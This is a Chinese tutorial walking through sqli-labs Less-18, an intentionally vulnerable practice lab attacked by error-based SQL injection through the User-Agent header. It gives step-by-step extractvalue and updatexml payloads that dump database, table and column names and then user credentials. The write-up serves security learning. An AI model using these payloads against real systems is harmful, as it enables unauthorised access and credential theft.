# sqli-labs Less-18 复现（User-Agent头部报错注入）✅

## 一、环境准备

1.  本地已部署sqli-labs环境（需满足PHP+MySQL运行条件），确保Less-18页面可正常访问（访问路径示例：http://localhost/sqli-labs/Less-18/）。

2.  安装Burp Suite工具，配置浏览器代理（通常为127.0.0.1:8080），开启Burp的拦截功能，确保能正常捕获浏览器发送的HTTP请求。

3.  确认浏览器可正常访问目标页面，且能完成基础登录操作（默认测试账号可使用admin/admin）。

## 二、注入原理

Less-18 核心是**HTTP User-Agent头部注入**，区别于常规的GET/POST参数注入。后台代码会获取客户端发送的User-Agent（浏览器标识）字段，将其作为数据插入到数据库表中，但未对该字段进行任何SQL注入过滤（如转义、过滤特殊字符）。

当我们构造包含恶意SQL语句的User-Agent值时，后台会将其拼接进SQL执行语句，触发数据库报错，借助报错信息即可逐步获取数据库名称、表名、字段名及用户数据等核心信息。

核心报错函数仍可使用extractvalue()和updatexml()，与Less-19报错注入逻辑一致，仅注入位置从Referer改为User-Agent。

## 三、复现步骤（详细可复现）

### 1.  定位注入点（触发User-Agent写入）

访问Less-18页面，在登录表单中输入用户名：admin、密码：admin（默认有效账号），点击「Submit」按钮提交登录请求。

此时后台会执行SQL插入操作，将当前浏览器的User-Agent值写入数据库，这个User-Agent字段就是我们的注入点。

### 2.  Burp抓包并修改User-Agent

1.  确保Burp Suite拦截功能已开启，重新点击登录按钮，捕获登录时的POST请求（请求地址为Less-18页面，请求方法为POST）。

2.  在捕获的请求头中，找到「User-Agent」字段，原始值通常为浏览器默认标识（示例：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...）。

3.  替换User-Agent字段的值为测试payload，验证注入点是否存在，测试payload如下：

```sql
' or extractvalue(1,concat(0x7e,'测试注入')) -- -
```

4.  点击Burp的「Forward」按钮发送修改后的请求，若页面出现报错信息（包含“测试注入”），说明注入点存在，可继续后续操作。

### 3.  分步注入，获取数据库信息

所有操作均为「修改User-Agent字段为对应payload → 发送请求 → 查看页面报错信息 → 提取数据」，步骤如下：

#### （1）获取当前数据库名

Payload（替换User-Agent值）：

```sql
' or extractvalue(1,concat(0x7e,database())) -- -
```

预期结果：页面报错显示数据库名，默认sqli-labs的数据库名为「security」（报错信息示例：XPATH syntax error: '~security'）。

#### （2）获取数据库中的表名

Payload（获取第一个表名，limit 0,1表示第1个，依次修改0为1、2、3获取所有表）：

```sql
' or extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1))) -- -
```

预期结果：依次获取到security数据库的表名：emails、referers、uagents、users（重点关注users表，包含用户账号密码）。

#### （3）获取users表的字段名

Payload（获取第一个字段名，limit 0,1可依次修改获取所有字段）：

```sql
' or extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1))) -- -
```

预期结果：依次获取到users表的字段：id、username、password（核心字段）。

#### （4）获取users表中的用户数据（账号+密码）

Payload（获取第一个用户的账号密码，limit 0,1依次修改获取所有用户）：

```sql
' or extractvalue(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1))) -- -
```

预期结果：依次获取到用户信息，示例：Dumb:Dumb、Angelina:I-kill-you、admin:admin等。

## 四、注意事项

1.  报错注入限制：extractvalue()和updatexml()函数的输出长度有限（最大32个字符），若获取的数据过长（如长密码），需使用substring()函数分段获取，示例：

```sql
' or extractvalue(1,concat(0x7e,substring((select password from users where username='admin'),1,30))) -- -
```

2.  User-Agent字段特性：部分浏览器会自动修改User-Agent值，建议全程使用Burp Suite手动修改，确保payload准确传入后台，避免注入失败。

3.  替代函数：可使用updatexml()替代extractvalue()，payload结构完全一致，仅替换函数名，示例：

```sql
' or updatexml(1,concat(0x7e,database()),1) -- -
```

4.  登录验证：Less-18需先完成正常登录（admin/admin），才能触发User-Agent写入数据库，未登录状态下修改User-Agent无效。
> （注：文档部分内容可能由 AI 生成）